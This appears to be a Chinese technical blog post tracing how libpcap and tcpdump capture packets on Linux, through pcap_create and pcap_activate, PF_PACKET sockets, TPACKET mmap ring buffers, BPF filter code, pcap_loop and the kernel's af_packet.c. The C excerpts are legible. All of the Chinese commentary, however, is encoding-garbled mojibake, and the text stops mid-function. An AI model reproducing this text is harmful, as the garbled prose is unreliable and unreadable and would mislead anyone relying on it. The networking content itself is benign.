å¦‚ä¸‹,å¯ä»¥è®¤ä¸ºåªè°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°,ä¸€ä¸ªpcap_create,ä¸€ä¸ªpcap_activate\n1 2 3 4 5 6 7 8 9 10 pcap_t * pcap_open_live(const char *device, int snaplen, int promisc, int to_ms, char *errbuf) { pcap_t *p; int status; p = pcap_create(device, errbuf); // çœç•¥pè®¾ç½®é»˜è®¤å€¼ status = pcap_activate(p); return p; } pcap_create pcap_create()è°ƒç”¨é“¾å¦‚ä¸‹,è®¾ç½®äº†ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆ,ä¸€ä¸ªæ˜¯activate_op,ä¸ºåç»­activate\nå¦ä¸€ä¸ªå¼€å¯äº†æ— çº¿æ¨¡å¼(é»˜è®¤pcap_create_commonåˆ›å»ºæ—¶å…³é—­çš„)\nconfigureä¸­é»˜è®¤æ˜¯$as_echo \u0026ldquo;#define HAVE_LIBNL 1\u0026rdquo; \u0026raquo;confdefs.h\nç„¶åpcap_can_set_rfmon_linux()æ£€æµ‹mac80211 device,å¦‚æœå­˜åœ¨å°±é»˜è®¤æ”¯æŒæ— çº¿æ¨¡å¼\npcap_open_live()ä¸­[p = pcap_create(device, errbuf);]-\u0026gt;pcap_create()-\u0026gt;pcap_create_interface()-\u0026gt;pcap_create_common()\r// pcap-linux.cä¸­pcap_create_interface()ä¸ºpcap_tè®¾ç½®å…·ä½“å‡½æ•°æŒ‡é’ˆ,ä¸»è¦æ˜¯ä¸‹é¢ä¸¤ä¸ª\rhandle-\u0026gt;activate_op = pcap_activate_linux;\rhandle-\u0026gt;can_set_rfmon_op = pcap_can_set_rfmon_linux; pcap_create()ç®€åŒ–ä»£ç å¦‚ä¸‹\ntcpdumpçš„mainå‡½æ•°å°±æ˜¯ç›´æ¥è°ƒç”¨pcap_create()å’Œpcap_activate(),ç„¶åç”¨pcap_loop()å¾ªç¯æ”¶åŒ…\nhttps://github.com/the-tcpdump-group/tcpdump/blob/master/tcpdump.c#L1270\nhttps://github.com/the-tcpdump-group/tcpdump/blob/master/tcpdump.c#L2600\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 pcap_t * pcap_create(const char *device, char *errbuf) { size_t i; int is_theirs; pcap_t *p; char *device_str; if (device == NULL) device_str = (\u0026#34;any\u0026#34;); else { device_str = strdup(device); } p = pcap_create_interface(device_str, errbuf); p-\u0026gt;opt.device = device_str; return (p); } pcap_activate pcap_activate()è°ƒç”¨é“¾å¦‚ä¸‹,pcap_tçš„active_opæ–¹æ³•,å¯ç”¨ä¹‹å‰è®¾ç½®çš„pcap_activate_linux,æ¥ç€è°ƒç”¨activate_pf_packet,å…¶ä¸­ç”¨socketç³»ç»Ÿè°ƒç”¨åˆ›å»ºåŸå§‹å¥—æ¥å­—\n\u0026lt;!-- pcap_open_live()ä¸­[status = pcap_activate(p);] --\u0026gt;\rpcap_activate()-\u0026gt;pcap_activate_linux()-\u0026gt;activate_pf_packet()-\u0026gt;socket()\r-\u0026gt;setup_mmapped()-\u0026gt;prepare_tpacket_socket()-\u0026gt;init_tpacket()-\u0026gt;getsockopt()\u0026amp;setsockopt()\r-\u0026gt;create_ring() 1 2 3 4 5 // pcap_activate() // è°ƒç”¨ä¸Šé¢pcap_open_live()è°ƒç”¨çš„pcap_create_interface()ä¸­åˆ›å»ºçš„å‡½æ•°æŒ‡é’ˆ pcap_activate_linux; // å¹¶ä¸”æ£€æµ‹æ˜¯å¦è®¾ç½®äº†non-blocking mode,æ˜¯çš„è¯å°±è°ƒç”¨pcap_activate_linux()ä¸­è®¾ç½®çš„å‡½æ•°æŒ‡é’ˆpcap_setnonblock_linux status = p-\u0026gt;activate_op(p); status = p-\u0026gt;setnonblock_op(p, 1); pcap_activate()ç®€åŒ–ä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 int pcap_activate(pcap_t *p) { int status; status = p-\u0026gt;activate_op(p); // å¦‚æœè°ƒç”¨pcap_activate()å‰è®¾ç½®äº†non-blocking mode, ç°åœ¨æ‰“å¼€å®ƒ if (p-\u0026gt;opt.nonblock) { status = p-\u0026gt;setnonblock_op(p, 1);\t// è°ƒç”¨pcap_setnonblock_linux } p-\u0026gt;activated = 1; return (status); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // pcap_activate_linux() // ...... ret = activate_pf_packet(handle, is_any_device); // ...... ret = setup_mmapped(handle, \u0026amp;status); // å®ç°ä¸€ç³»åˆ—å‡½æ•°æŒ‡é’ˆçš„èµ‹å€¼ // æ•è·åŒ…ä¼šè°ƒç”¨è¿™ä¸ªæ¥å£ // å†…æ ¸mmapçš„æ–¹å¼æ¥æŠ“å–æŠ¥æ–‡ // PACKET_MMAPéå¸¸é«˜æ•ˆ,å®ƒæä¾›ä¸€ä¸ªæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„å¤§å°å¯é…ç½®çš„ring buffer // è¿™ç§æ–¹å¼,è¯»å–æŠ¥æ–‡åªéœ€è¦ç­‰å¾…æŠ¥æ–‡å°±å¯ä»¥äº†,å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸éœ€è¦ç³»ç»Ÿè°ƒç”¨ // é€šè¿‡å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´å…±äº«çš„ç¼“å†²åŒºè¿˜å¯ä»¥èµ·åˆ°å‡å°‘æ•°æ®æ‹·è´çš„ä½œç”¨ switch (handlep-\u0026gt;tp_version) { case TPACKET_V2: handle-\u0026gt;read_op = pcap_read_linux_mmap_v2; break; #ifdef HAVE_TPACKET3 case TPACKET_V3: handle-\u0026gt;read_op = pcap_read_linux_mmap_v3; break; #endif } // centos 7æ˜¯å…³é—­v3çš„ // * Tue Dec 02 2014 Michal Sekletar \u0026lt;msekleta@redhat.com\u0026gt; - 14:1.5.3-4 // - disable TPACKET_V3 memory mapped packet capture on AF_PACKET socket, use TPACKET_V2 instead (#1085096) activate_pf_packet ç®€å•æ¥è¯´å°±æ˜¯åˆ›å»ºPF_PACKETå¥—æ¥å­—\n1 2 3 4 5 6 // activate_pf_packet() sock_fd = is_any_device ? socket(PF_PACKET, SOCK_DGRAM, 0) : socket(PF_PACKET, SOCK_RAW, 0); ... handle-\u0026gt;fd = sock_fd; setup_mmapped 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // pcap-linux.c static int setup_mmapped(pcap_t *handle, int *status) { struct pcap_linux *handlep = handle-\u0026gt;priv; int ret; /* * Attempt to allocate a buffer to hold the contents of one * packet, for use by the oneshot callback. */ handlep-\u0026gt;oneshot_buffer = malloc(handle-\u0026gt;snapshot); // ... if (handle-\u0026gt;opt.buffer_size == 0) { /* é»˜è®¤ç”³è¯· 2M çš„ring buffer */ handle-\u0026gt;opt.buffer_size = 2*1024*1024; } ret = prepare_tpacket_socket(handle); // ... ret = create_ring(handle, status); // ... /* * handle-\u0026gt;offset is used to get the current position into the rx ring. * handle-\u0026gt;cc is used to store the ring size. */ /* * Set the timeout to use in poll() before returning. */ set_poll_timeout(handlep); return 1; } prepare_tpacket_socket()ä¸­æ ¹æ®é…ç½®æ˜¯å¦æ”¯æŒTPACKET_V3æ¥è°ƒç”¨init_tpacket(),æ²¡æœ‰v3çš„è¯å°±å°è¯•v2,v2çš„init_tpacket()è¿”å›å€¼-1å¤±è´¥0æˆåŠŸ1å†…æ ¸ç‰ˆæœ¬è¿‡è€æ”¯æŒMMAPä½†ä¸æ”¯æŒv2.\n1 2 3 4 5 6 7 8 9 10 11 // pcap-linux.c static int prepare_tpacket_socket(pcap_t *handle) { int ret; #ifdef HAVE_TPACKET3 ret = init_tpacket(handle, TPACKET_V3, \u0026#34;TPACKET_V3\u0026#34;); return ret; #endif ret = init_tpacket(handle, TPACKET_V2, \u0026#34;TPACKET_V2\u0026#34;); return ret; } init_tpacket æ¢æµ‹å†…æ ¸æ˜¯å¦æ”¯æŒæŒ‡å®šçš„TPACKETç‰ˆæœ¬ æ”¯æŒçš„è¯å°±é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆå§‹åŒ–tpacket æ²¡å•¥å¥½è¯´çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // pcap-linux.c static int init_tpacket(pcap_t *handle, int version, const char *version_str) { struct pcap_linux *handlep = handle-\u0026gt;priv; int val = version; socklen_t len = sizeof(val); if (getsockopt(handle-\u0026gt;fd, SOL_PACKET, PACKET_HDRLEN, \u0026amp;val, \u0026amp;len) \u0026lt; 0) { err... } /* hdrlen of tpacket_hdr for mmaped ring */ handlep-\u0026gt;tp_hdrlen = val; val = version; if (setsockopt(handle-\u0026gt;fd, SOL_PACKET, PACKET_VERSION, \u0026amp;val, sizeof(val)) \u0026lt; 0) { err... } /* version of tpacket_hdr for mmaped ring */ handlep-\u0026gt;tp_version = version; return 0; } create_ring()ä¸»è¦æ˜¯ç¯çš„åˆ›å»º\nå…ˆæ˜¯æ ¹æ®ç‰ˆæœ¬åˆ›å»ºå¯¹åº”tpacket_reqç»“æ„ä½“å¹¶è®¾ç½®å‚æ•°\nç„¶åé€šè¿‡setsockoptè®¾ç½®PACKET_RX_RING\nmemory map the rx ring(mmapæ˜¯ç³»ç»Ÿè°ƒç”¨)\nåˆ›å»ºä¸€ä¸ªç¯ï¼Œç„¶åä¸ºç¯ä¸­æ¯ä¸ªheaderè®¾ç½®frame ptr\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // create_ring() struct tpacket_req { unsigned int\ttp_block_size;\t/* Minimal size of contiguous block */ unsigned int\ttp_block_nr;\t/* Number of blocks */ unsigned int\ttp_frame_size;\t/* Size of frame */ unsigned int\ttp_frame_nr;\t/* Total number of frames */ }; struct tpacket_req3 { unsigned int\ttp_block_size;\t/* Minimal size of contiguous block */ unsigned int\ttp_block_nr;\t/* Number of blocks */ unsigned int\ttp_frame_size;\t/* Size of frame */ unsigned int\ttp_frame_nr;\t/* Total number of frames */ unsigned int\ttp_retire_blk_tov; /* timeout in msecs */ unsigned int\ttp_sizeof_priv; /* offset to private data area */ unsigned int\ttp_feature_req_word; }; if (setsockopt(handle-\u0026gt;fd, SOL_PACKET, PACKET_RX_RING, (void *) \u0026amp;req, sizeof(req))) { return -1; } /* memory map the rx ring */ handlep-\u0026gt;mmapbuflen = req.tp_block_nr * req.tp_block_size; handlep-\u0026gt;mmapbuf = mmap(0, handlep-\u0026gt;mmapbuflen, PROT_READ|PROT_WRITE, MAP_SHARED, handle-\u0026gt;fd, 0); /* allocate a ring for each frame header pointer*/ handle-\u0026gt;cc = req.tp_frame_nr; handle-\u0026gt;buffer = malloc(handle-\u0026gt;cc * sizeof(union thdr *)); /* fill the header ring with proper frame ptr*/ handle-\u0026gt;offset = 0; for (i=0; i\u0026lt;req.tp_block_nr; ++i) { u_char *base = \u0026amp;handlep-\u0026gt;mmapbuf[i*req.tp_block_size]; for (j=0; j\u0026lt;frames_per_block; ++j, ++handle-\u0026gt;offset) { RING_GET_CURRENT_FRAME(handle) = base; base += req.tp_frame_size; } } handle-\u0026gt;bufsize = req.tp_frame_size; handle-\u0026gt;offset = 0; return 1; pcap_read_linux_mmap_v3 å°±æ˜¯ä»å†…æ ¸å¾ªç¯æ”¶åŒ…å¹¶è°ƒç”¨å›è°ƒå‡½æ•°çš„è¿‡ç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 // pcap-linux.c // å‚æ•°è·Ÿpcap_loopå®Œå…¨ç›¸åŒ å®é™…ä¸Špcap_loopå°±æ˜¯readopçš„wrapper å¾€ä¸Šç¿»å¯ä»¥çœ‹ç”¨æ³• å¾€ä¸‹ç¿»æœ‰pcap_loopçš„æºç  static int pcap_read_linux_mmap_v3(pcap_t *handle, int max_packets, pcap_handler callback, u_char *user) { struct pcap_linux *handlep = handle-\u0026gt;priv; union thdr h; int pkts = 0; int ret; again: h.raw = RING_GET_CURRENT_FRAME(handle); // ... /* non-positive values of max_packets are used to require all * packets currently available in the ring */ while ((pkts \u0026lt; max_packets) || PACKET_COUNT_IS_UNLIMITED(max_packets)) { int packets_to_read; if (handlep-\u0026gt;current_packet == NULL) { h.raw = RING_GET_CURRENT_FRAME(handle); if (!packet_mmap_v3_acquire(h.h3)) break; handlep-\u0026gt;current_packet = h.raw + h.h3-\u0026gt;hdr.bh1.offset_to_first_pkt; handlep-\u0026gt;packets_left = h.h3-\u0026gt;hdr.bh1.num_pkts; } packets_to_read = handlep-\u0026gt;packets_left; if (!PACKET_COUNT_IS_UNLIMITED(max_packets) \u0026amp;\u0026amp; packets_to_read \u0026gt; (max_packets - pkts)) { /* * We\u0026#39;ve been given a maximum number of packets * to process, and there are more packets in * this buffer than that. Only process enough * of them to get us up to that maximum. */ packets_to_read = max_packets - pkts; } while (packets_to_read-- \u0026amp;\u0026amp; !handle-\u0026gt;break_loop) { struct tpacket3_hdr* tp3_hdr = (struct tpacket3_hdr*) handlep-\u0026gt;current_packet; ret = pcap_handle_packet_mmap( handle, callback, user, handlep-\u0026gt;current_packet, tp3_hdr-\u0026gt;tp_len, tp3_hdr-\u0026gt;tp_mac, tp3_hdr-\u0026gt;tp_snaplen, tp3_hdr-\u0026gt;tp_sec, handle-\u0026gt;opt.tstamp_precision == PCAP_TSTAMP_PRECISION_NANO ? tp3_hdr-\u0026gt;tp_nsec : tp3_hdr-\u0026gt;tp_nsec / 1000, VLAN_VALID(tp3_hdr, \u0026amp;tp3_hdr-\u0026gt;hv1), tp3_hdr-\u0026gt;hv1.tp_vlan_tci, VLAN_TPID(tp3_hdr, \u0026amp;tp3_hdr-\u0026gt;hv1)); if (ret == 1) { pkts++; } else if (ret \u0026lt; 0) { handlep-\u0026gt;current_packet = NULL; return ret; } handlep-\u0026gt;current_packet += tp3_hdr-\u0026gt;tp_next_offset; handlep-\u0026gt;packets_left--; } if (handlep-\u0026gt;packets_left \u0026lt;= 0) { /* * Hand this block back to the kernel, and, if * we\u0026#39;re counting blocks that need to be * filtered in userland after having been * filtered by the kernel, count the one we\u0026#39;ve * just processed. */ packet_mmap_v3_release(h.h3); if (handlep-\u0026gt;blocks_to_filter_in_userland \u0026gt; 0) { handlep-\u0026gt;blocks_to_filter_in_userland--; if (handlep-\u0026gt;blocks_to_filter_in_userland == 0) { /* * No more blocks need to be filtered * in userland. */ handlep-\u0026gt;filter_in_userland = 0; } } /* next block */ if (++handle-\u0026gt;offset \u0026gt;= handle-\u0026gt;cc) handle-\u0026gt;offset = 0; handlep-\u0026gt;current_packet = NULL; } /* check for break loop condition*/ if (handle-\u0026gt;break_loop) { handle-\u0026gt;break_loop = 0; return PCAP_ERROR_BREAK; } } if (pkts == 0 \u0026amp;\u0026amp; handlep-\u0026gt;timeout == 0) { /* Block until we see a packet. */ goto again; } return pkts; } pcap_wait_for_frames_mmap-\u0026gt;poll\npcap_compile\u0026amp;\u0026amp;pcap_setfilter pcap_compileä¸­æ¶‰åŠè¯æ³•åˆ†æç­‰ç¼–è¯‘åŸç†å†…å®¹,ååˆ†å¤æ‚(ä»£ç é‡æ˜¯æ ¸å¿ƒéƒ¨åˆ†ä¸¤å€),æš‚æ—¶ä¸æ·±å…¥ç ”ç©¶\næ­¤å¤„å¯é€šè¿‡tcpdumpçš„-då‚æ•°ä»¥ç±»æ±‡ç¼–æŒ‡ä»¤è¾“å‡ºç¼–è¯‘çš„packet-matching code\nå®˜æ–¹è§£é‡Š:Dump the compiled packet-matching code in a human readable form to standard output and stop.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt; sudo tcpdump host 192.168.142.1 -d (000) ldh [12] (001) jeq #0x800 jt 2 jf 6 (002) ld [26] (003) jeq #0xc0a88e01 jt 12 jf 4 (004) ld [30] (005) jeq #0xc0a88e01 jt 12 jf 13 (006) jeq #0x806 jt 8 jf 7 (007) jeq #0x8035 jt 8 jf 13 (008) ld [28] (009) jeq #0xc0a88e01 jt 12 jf 10 (010) ld [38] (011) jeq #0xc0a88e01 jt 12 jf 13 (012) ret #262144 (013) ret #0 jeq = judge equal\rjt = judge true\rjf = judge false\rld = load?\rä¸Šæ–¹ä¸€å…±14è¡Œä»£ç \r(000)è·³åˆ°12å­—èŠ‚å¤„\r// PS:ä»¥å¤ªç½‘å¤´ç›®æ ‡MAC6å­—èŠ‚ æºMACå­—èŠ‚\r(001)åˆ¤æ–­æ˜¯å¦ç­‰äº0x800 ç­‰äºè·³åˆ°(002) ä¸ç­‰è·³åˆ°(006)\r// PS:æ­¤å¤„0x800ä»£è¡¨çš„æ˜¯IPv4\r(002)è·³è½¬åˆ°26å­—èŠ‚\r// PS:ä»¥å¤ªç½‘å¸§14å­—èŠ‚(12å­—èŠ‚MAC+2å­—èŠ‚Type),IPv4å¤´20å­—èŠ‚ æœ€å8å­—èŠ‚ä¸ºæºåœ°å€å’Œç›®æ ‡åœ°å€ 26=14+20-8 ä¹Ÿå°±æ˜¯è·³åˆ°æºåœ°å€çš„åœ°æ–¹\r(003)ç»§ç»­å¾€ä¸‹æ‰§è¡Œ æ­¤å¤„åˆ¤æ–­æ˜¯å¦ç­‰äº0xc0a88e01 ç›¸ç­‰è·³åˆ°(012) ä¸ç­‰è·³åˆ°(0004)\r// PS:0xc0a88e01å°±æ˜¯tcpdumpå‘½ä»¤ä¸­è¾“å…¥åœ°å€192.168.142.1çš„åå…­è¿›åˆ¶è¡¨ç¤º æ­¤å¤„åˆ¤æ–­æºåœ°å€æ˜¯å¦ä¸ºæŒ‡å®šåœ°å€,æ˜¯çš„è¯å°±è·³åˆ°(012)ç›´æ¥ret\r(004)è·³åˆ°30å­—èŠ‚å¤„\r// PS:å¦‚æœæºåœ°å€ä¸æ˜¯æˆ‘ä»¬æŒ‡å®šçš„åœ°å€å°±è·³åˆ°(004),åŒåˆšæ‰æºåœ°å€çš„è®¡ç®—30=14+20-4\r(005)åˆ¤æ–­æ˜¯å¦ä¸ºæŒ‡å®šçš„ip æ˜¯çš„è¯è·³åˆ°(012) ä¸æ˜¯çš„è¯è·³åˆ°(013)\r// PS:ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸æ˜¯æºåœ°å€å°±åˆ¤æ–­æ˜¯ä¸æ˜¯ç›®æ ‡åœ°å€ æ˜¯çš„è¯å°±ret #262144\r(006)åˆ¤æ–­æ˜¯å¦ç­‰äº0x806 ç­‰äºè·³åˆ°(008) ä¸ç­‰è·³åˆ°(007)\r// PS:ä¸ç­‰äº0x800åè·³è½¬åˆ°æ­¤å¤„ç»§ç»­åˆ¤æ–­æ˜¯å¦ç­‰äº0x806 0x806è¡¨ç¤ºçš„æ˜¯ARPåè®®\r(007)åˆ¤æ–­æ˜¯å¦ç­‰äº0x8035 ç­‰äºè·³è½¬(008) ä¸ç­‰è·³è½¬(013)\r// PS:\r(008)è·³è½¬åˆ°28å­—èŠ‚å¤„\r// PS:ARPåè®®å¤´ä¸º28å­—èŠ‚,æœ€åä¸º6å­—èŠ‚æºMac 4å­—èŠ‚æºip 6å­—èŠ‚ç›®æ ‡Mac 4å­—èŠ‚ç›®æ ‡ip,28=14+28-(4+6+4) ä¹Ÿå°±æ˜¯è·³åˆ°æºipå¤„\r(009)åˆ¤æ–­æ˜¯å¦ä¸ºæŒ‡å®šip æ˜¯è·³è½¬(012) ä¸æ˜¯è·³è½¬(010)\r// PS: åˆ¤æ–­ARPåè®®çš„æºipæ˜¯å¦ä¸ºæˆ‘ä»¬æŒ‡å®šip (010)è·³è½¬åˆ°38å­—èŠ‚å¤„\r// PS:åŒä¸Šæ–¹arpæºipåç§»è®¡ç®—æ­¤å¤„38=14+28-4 (011)åˆ¤æ–­æ˜¯å¦ä¸ºåªå½“ip æ˜¯æŒ‘æˆ˜(012) ä¸æ˜¯è·³è½¬(013)\r// PS:å³åˆ¤æ–­ç›®æ ‡ipæ˜¯å¦ä¸ºæŒ‡å®šip\r(012) ret #262144\r(013) ret #0 pcap_setfilterè°ƒç”¨é“¾,æœ€ç»ˆè°ƒç”¨setsockopté€šçŸ¥å†…æ ¸å¯ç”¨è¿‡æ»¤\npcap_setfilter-\u0026gt;pcap_setfilter_linux-\u0026gt;set_kernel_filter-\u0026gt;setsockopt\rsetsockopt(handle-\u0026gt;fd, SOL_SOCKET, SO_ATTACH_FILTER, \u0026amp;total_fcode, sizeof(total_fcode)) pcap_loop pcap_loopçš„é€»è¾‘ååˆ†ç®€å•,å¦‚æœp-\u0026gt;rfileä¸ä¸ºç©ºå°±å­˜å…¥æ–‡ä»¶,å¦åˆ™è°ƒç”¨p-\u0026gt;read_op()\nè€Œæˆ‘ä»¬çš„read_op()æ˜¯åœ¨pcap_activate_linux()ä¸­æ ¹æ®ç‰ˆæœ¬è®¾ç½®çš„å‡½æ•°æŒ‡é’ˆpcap_read_linux_mmap_v3/pcap_read_linux_mmap_v2\n(ç½‘ä¸Šçœ‹å…¶ä»–äººå¯¹è€ç‰ˆæœ¬çš„æºç åˆ†æpcap_loopä¸­è¿˜æ˜¯ä¸æ–­recvfromæ¥å¾ªç¯æ”¶åŒ…)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) { register int n; for (;;) { if (p-\u0026gt;rfile != NULL) { // 0 means EOF, so don\u0026#39;t loop if we get 0. n = pcap_offline_read(p, cnt, callback, user); } else { do { n = p-\u0026gt;read_op(p, cnt, callback, user); } while (n == 0); } } } kernel/netç»“æ„ä½“ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 // include/net/sock.h // ç½‘ç»œå±‚å¥—æ¥å­— network layer representation of sockets struct sock { } // net/packet/internal.h struct packet_sock { /* struct sock has to be the first member of packet_sock */ struct sock\tsk; struct packet_fanout\t*fanout; union tpacket_stats_u\tstats; struct packet_ring_buffer\trx_ring; struct packet_ring_buffer\ttx_ring; int\tcopy_thresh; spinlock_t\tbind_lock; struct mutex\tpg_vec_lock; unsigned int\trunning;\t/* bind_lock must be held */ unsigned int\tauxdata:1,\t/* writer must hold sock lock */ origdev:1, has_vnet_hdr:1, tp_loss:1, tp_tx_has_off:1; int\tpressure; int\tifindex;\t/* bound device\t*/ __be16\tnum; struct packet_rollover\t*rollover; struct packet_mclist\t*mclist; atomic_t\tmapped; enum tpacket_versions\ttp_version; unsigned int\ttp_hdrlen; unsigned int\ttp_reserve; unsigned int\ttp_tstamp; struct completion\tskb_completion; struct net_device __rcu\t*cached_dev; int\t(*xmit)(struct sk_buff *skb); struct packet_type\tprot_hook ____cacheline_aligned_in_smp; atomic_t\ttp_drops ____cacheline_aligned_in_smp; }; // include/linux/netdevice.h struct packet_type { __be16\ttype;\t/* This is really htons(ether_type). */ bool\tignore_outgoing; struct net_device\t*dev;\t/* NULL is wildcarded here\t*/ int\t(*func) (struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *); void\t(*list_func) (struct list_head *, struct packet_type *, struct net_device *); bool\t(*id_match)(struct packet_type *ptype, struct sock *sk); void\t*af_packet_priv; struct list_head\tlist; }; kernel/net æºç  net/packet/af_packet.c/packet_init 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 static int __init packet_init(void) { int rc; rc = proto_register(\u0026amp;packet_proto, 0); if (rc) goto out; rc = sock_register(\u0026amp;packet_family_ops); if (rc) goto out_proto; rc = register_pernet_subsys(\u0026amp;packet_net_ops); if (rc) goto out_sock; rc = register_netdevice_notifier(\u0026amp;packet_netdev_notifier); if (rc) goto out_pernet; return 0; out_pernet: unregister_pernet_subsys(\u0026amp;packet_net_ops); out_sock: sock_unregister(PF_PACKET); out_proto: proto_unregister(\u0026amp;packet_proto); out: return rc; } module_exit(packet_exit); module_initæ¨¡å—åˆå§‹åŒ– ç¨‹åºè¿è¡Œçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨packet_initåˆå§‹åŒ–æ¨¡å—\nsock_register æœ¬è´¨æ˜¯å°† struct net_proto_family packet_family_ops æ³¨å†Œåˆ°socket.cä¸€ä¸ªå…¨å±€çš„ *net_families[NPROTO] å˜é‡ä¸­\nnet/socket.c ç³»ç»Ÿé€šè¿‡socket()å»ºç«‹é€šä¿¡\nsocket() æœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº† sock_create() å‡½æ•°å¹¶ç”¨sock_map_fd()å°†socketç»‘å®šåˆ°æ–‡ä»¶æè¿°ç¬¦ä¸Š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern) { int err; struct socket *sock; const struct net_proto_family *pf; ...... #ifdef CONFIG_MODULES /* Attempt to load a protocol module if the find failed. * * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user * requested real, full-featured networking support upon configuration. * Otherwise module support will break! */ if (rcu_access_pointer(net_families[family]) == NULL) request_module(\u0026#34;net-pf-%d\u0026#34;, family); #endif rcu_read_lock(); pf = rcu_dereference(net_families[family]); err = -EAFNOSUPPORT; if (!pf) goto out_release; /* * We will call the -\u0026gt;create function, that possibly is in a loadable * module, so we have to bump that loadable module refcnt first. */ if (!try_module_get(pf-\u0026gt;owner)) goto out_release; /* Now protected by module ref count */ rcu_read_unlock(); err = pf-\u0026gt;create(net, sock, protocol, kern); if (err \u0026lt; 0) goto out_module_put; ...... *res = sock; return 0; out_module_busy: err = -EAFNOSUPPORT; out_module_put: sock-\u0026gt;ops = NULL; module_put(pf-\u0026gt;owner); out_sock_release: sock_release(sock); return err; out_release: rcu_read_unlock(); goto out_sock_release; } EXPORT_SYMBOL(__sock_create); è¿™é‡Œé€šè¿‡pf-\u0026gt;create(net, sock, protocol, kern); è°ƒç”¨ä¹‹å‰pf_packet initæ—¶ç»‘å®šåˆ° net_families[family]çš„createæ–¹æ³•å³: packet_create\nnet/packet/af_packet.c/packet_create å¦‚æ³¨é‡Šæ‰€å†™ï¼Œè¿™ä¸ªå‡½æ•°Create a packet of type SOCK_PACKET.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 static int packet_create(struct net *net, struct socket *sock, int protocol, int kern) { struct sock *sk; struct packet_sock *po; __be16 proto = (__force __be16)protocol; /* weird, but documented */ int err; if (!ns_capable(net-\u0026gt;user_ns, CAP_NET_RAW)) return -EPERM; if (sock-\u0026gt;type != SOCK_DGRAM \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_RAW \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_PACKET) return -ESOCKTNOSUPPORT; sock-\u0026gt;state = SS_UNCONNECTED; err = -ENOBUFS; sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, \u0026amp;packet_proto, kern);\t// åˆ›å»ºsocket if (sk == NULL) goto out; sock-\u0026gt;ops = \u0026amp;packet_ops;\t// è®¾ç½®ä¸€ç³»åˆ—æ“ä½œå‡½æ•° if (sock-\u0026gt;type == SOCK_PACKET) sock-\u0026gt;ops = \u0026amp;packet_ops_spkt; sock_init_data(sock, sk); // å°†sockç»“æ„ä½“skè®¾ç½®åˆ°packet_sockç»“æ„ä½“poä¸­ (struct sock has to be the first member of packet_sock) po = pkt_sk(sk); init_completion(\u0026amp;po-\u0026gt;skb_completion); sk-\u0026gt;sk_family = PF_PACKET; po-\u0026gt;num = proto; po-\u0026gt;xmit = dev_queue_xmit; err = packet_alloc_pending(po); if (err) goto out2; packet_cached_dev_reset(po); sk-\u0026gt;sk_destruct = packet_sock_destruct; sk_refcnt_debug_inc(sk); /* *\tAttach a protocol block */ spin_lock_init(\u0026amp;po-\u0026gt;bind_lock); mutex_init(\u0026amp;po-\u0026gt;pg_vec_lock); po-\u0026gt;rollover = NULL; po-\u0026gt;prot_hook.func = packet_rcv;\t// packet_type ç»“æ„ä½“(packet_sockç»“æ„ä½“ä¸­prot_hookæ˜¯packet_typeç±»å‹) æ³¨å†Œçš„å¤„ç†å‡½æ•° packet_rcv if (sock-\u0026gt;type == SOCK_PACKET) po-\u0026gt;prot_hook.func = packet_rcv_spkt; po-\u0026gt;prot_hook.af_packet_priv = sk; if (proto) { po-\u0026gt;prot_hook.type = proto; __register_prot_hook(sk);\t// è°ƒç”¨ net/core/dev.c/dev_add_pack() æ·»åŠ åˆ°å†…æ ¸ ptype_all é“¾è¡¨ä¸Š(kernel lists) } mutex_lock(\u0026amp;net-\u0026gt;packet.sklist_lock); sk_add_node_tail_rcu(sk, \u0026amp;net-\u0026gt;packet.sklist); mutex_unlock(\u0026amp;net-\u0026gt;packet.sklist_lock); preempt_disable(); 